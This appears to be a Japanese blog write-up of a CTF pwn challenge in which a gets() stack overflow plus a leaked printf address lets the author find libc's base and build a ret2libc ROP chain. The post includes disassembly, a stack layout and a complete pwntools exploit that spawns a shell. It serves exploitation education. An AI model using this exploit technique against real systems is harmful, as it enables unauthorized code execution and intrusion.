---
title: Daily-AlpacaHack 「no win func」Hard
description: printf のアドレスリークと Stack BOF を用いた Ret2Libc 攻撃を利用してシェルを奪取する問題
date: 2026-07-26 21:16:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, pwn]
math: true
---

# 20260719-daily_alpaca-pwn-hard-no_win_func

## Summary

本問は，`printf()` のアドレスリークと **Stack BOF** を用いた **Ret2Libc** 攻撃を利用してシェルを奪取する問題です．

> - **Category**: Pwn
> - **Description**: win 関数が無くてもシェルを取れる?
> - **Tools & TechStack**:
> 	- Python
> 	- Pwninit
> 	- Pwntools
> 	- Pwndbg
> - **Release**: 2026/07/19
{: .prompt-info }

**階層構造**
```
.
├── chal
├── compose.yml
├── Dockerfile
├── flag.txt
└── main.c

1 directory, 5 files
```

---
## プログラムの概要

**バイナリ保護機構**
```shell
$ checksec --file=chal
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

- **処理フロー**:
	- 64バイトのスタック領域 `buffer` が確保される．
	- `printf` 関数のアドレスがリークされる．
	- **BoF** が可能な `gets()` で確保した `buffer` に任意のサイズのデータを書き込める．

## ソースコードの調査

**「win 関数が無くてもシェルを取れる?」** という問題文から，`win` 関数は存在せず `Flag` 変数も存在しない中でシェルを取る方法が必要です．  

`NO Stack Canary` となっているため，唯一可能なのは **BOF** のみです．  
そこで，現時点で悪用可能な `printf` 関数の **Address Leak** と **Stack BOF** を利用してシェルを奪取する方法を考えます．

`main.c`
```c
// gcc -o chal main.c -fno-stack-protector -O0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void)
{
    char buffer[64]; // 64バイトのスタック領域
    // printf 関数自体のメモリ上のアドレスを表示
    printf("address of printf function: %p\n", printf); 
    printf("input > ");
    // 標準入力から改行文字が入力されるまで文字列を読み込む (BoF有り)
    gets(buffer);
    return 0;
}

__attribute__((constructor)) void setup()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

**ライブラリの抽出とパッチされたバイナリの作成**
```shell
$ docker compose up -d 

$ docker cp $(docker ps -q -f ancestor=no-win-func-simple-rop):/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6

$ docker cp -L $(docker ps -q -f ancestor=no-win-func-simple-rop):/lib64/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2

$ pwninit
```

## **Ret2Libc**

ふと，ライブラリ抽出時に目に入ったコンテナ名を見てみると，`no-win-func-simple-rop` となっており，**Return Oriented Programming** 攻撃を使用するというヒントを手に入れました．  

シンプルな **ROP** といえば，`Ret2Libc`[^1] を思いつきました．もし，`SHSTK` が問題サーバの環境で有効であれば失敗しますが，とりあえずやってみます．

### `libc` のベースアドレス求める

この手法を利用するためには，`libc` のベースアドレスが必須ですが，`printf()` がリークしているため以下の **式(1)** で求めることが可能です．  

$$
printf_{アドレス} - libc内のprintf_{固定オフセット} = libc_{ベースアドレス}
$$

### `buffer` から，`RIP` までの距離を測る

**`main()` のディスアセンブルコード**
```shell
   0x0000000000001179 <+0>:     endbr64
   0x000000000000117d <+4>:     push   rbp
   0x000000000000117e <+5>:     mov    rbp,rsp # スタック基準 (rbp) 
   0x0000000000001181 <+8>:     sub    rsp,0x40 # スタックを64byte確保
   0x0000000000001185 <+12>:    mov    rax,QWORD PTR [rip+0x2e54]        # 0x3fe0
   0x000000000000118c <+19>:    mov    rsi,rax
   0x000000000000118f <+22>:    lea    rax,[rip+0xe72]        # 0x2008
   0x0000000000001196 <+29>:    mov    rdi,rax
   0x0000000000001199 <+32>:    mov    eax,0x0
   0x000000000000119e <+37>:    call   0x1050 <printf@plt>
   0x00000000000011a3 <+42>:    lea    rax,[rip+0xe7e]        # 0x2028
   0x00000000000011aa <+49>:    mov    rdi,rax
   0x00000000000011ad <+52>:    mov    eax,0x0
   0x00000000000011b2 <+57>:    call   0x1050 <printf@plt>
   0x00000000000011b7 <+62>:    lea    rax,[rbp-0x40] # buffer の先頭 (rbp-64)
   0x00000000000011bb <+66>:    mov    rdi,rax # 第一引数 rdi に buffer のアドレスを渡す
   0x00000000000011be <+69>:    mov    eax,0x0
   0x00000000000011c3 <+74>:    call   0x1080 <gets@plt>
   0x00000000000011c8 <+79>:    mov    eax,0x0
   0x00000000000011cd <+84>:    leave
   0x00000000000011ce <+85>:    ret
```

ディスアセンブルコードから，以下の **式(2)** でオフセットが判明したため，72byte目までは適当な値で埋めます．

$$
\text{距離} = \text{bufferのサイズ}(64) + \text{保存されたrbpのサイズ}(8) = 72\text{バイト}\tag{2}
$$

## 解法

調査した情報から，最終的なスタックレイアウトは以下になりました．  
また，**64bit Ubuntu環境** の仕様である **MOVAPS命令**[^2] の制約により，`system()` 呼び出し時にスタックが16バイトの倍数にアラインメントされていないとクラッシュします．  
これを防ぐため，何もせず次の命令へ進むだけの `ret` ガジェットを1つ挟んでいます．

**スタックレイアウト**
```
[ "A" * 72 バイト ]         <- buffer から RIP まで適当な値で埋める
[ pop rdi; ret のアドレス ] <- RIP を上書き (rdi に次のデータを入れる命令)
[ "/bin/sh" のアドレス ]    <- rdi に入れる文字列のポインタ (pop rdi で rdi レジスタに格納される)
[ ret のアドレス ]          <- スタックアラインメント調整用
[ system() のアドレス ]     <- system("/bin/sh") の呼び出し
```

**バッファオーバフローの仕組み**
```
高位アドレス (上)
+---------------------------+
| 戻りアドレス (RIP)        | <- 73バイト目以降でここを乗っ取る
+---------------------------+
| 保存された旧 rbp          | (8バイト)
+---------------------------+ <--- 基準の rbp
|                           |
|                           |
| buffer[64] 領域           | (64バイト)
|                           |
|                           |
+---------------------------+ <--- rbp - 0x40 (getsで書き込み始める位置)
 低位アドレス (下)
```

このスタックが配置された状態で元の関数が `ret` すると，CPUは以下の順序で自動的に命令を連鎖実行します．

- **`pop rdi` が実行される**: スタックの次にある `"/bin/sh"` のアドレスが `rdi` レジスタに入る．
- **直後の `ret` が実行される**: さらに次のアドレス（アラインメント用の `ret`）へ飛ぶ．
- **最後の `ret` で `system` へ飛ぶ**: 第1引数 (`rdi`) が `"/bin/sh"` で，今から `system` 関数の実行状態になり，シェルが起動する．

これで，`Ret2Libc` 攻撃を実行するために必要な以下の情報が揃ったため，エクスプロイトコードを書きます．  
また，この攻撃はすでにメモリにある `libc` の関数を再利用するため，`NX Bit` の保護機構はバイパスできます．

1. **Buffer Over Flow**: スタックの戻りアドレス (`RIP`) を上書きするため．
2. **`Libc` のベースアドレス特定**: リークした `printf()` のアドレスから特定する．
3. **ガジェットの存在**: `pop rdi; ret` や文字列 `"/bin/sh"` が必要だが，`libc` の中に存在するはず． 

`exploit.py`
```python
from pwn import *

elf = ELF("./chal")
libc = ELF("./libc.so.6")

p = remote("localhost", 12346)

# printf のアドレスを取得
p.recvuntil(b"address of printf function: ")
leak_printf = int(p.recvline().strip(), 16)
log.info(f"printf leak: {hex(leak_printf)}")

rop = ROP(libc)

# libc のベースアドレスを計算
libc.address = leak_printf - libc.symbols["printf"]
log.info(f"libc base: {hex(libc.address)}")

# アドレスとガジェットの取得
system_addr = libc.symbols["system"]
binsh_addr = next(libc.search(b"/bin/sh\x00"))

# ガジェットの指定
pop_rdi = libc.address + rop.find_gadget(["pop rdi", "ret"])[0]
ret = libc.address + rop.find_gadget(["ret"])[0]

# ペイロード
offset = 72
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret) # 16バイトアラインメント調整
payload += p64(system_addr)

p.sendlineafter(b"input > ", payload)
p.interactive()
```

---
## Post-Mortem & Dead ends

`SHSTK: Enabled` / `IBT: Enabled` があるから，本来だったら `ret` 命令による戻りアドレスの改ざんが検知されて，**ROP** は実行できずにクラッシュするはず．  
でも，バイナリにマークがあってもホスト側が対応していかったから，実質無効だったみたい？

## References

[^1]: [Return-to-libc攻撃 - Wikipedia](https://ja.wikipedia.org/wiki/Return-to-libc%E6%94%BB%E6%92%83)

[^2]: [原書で学ぶ64bitアセンブラ入門（6） - わらばんし仄聞記](https://warabanshi.hatenablog.com/entry/2014/05/21/001419)
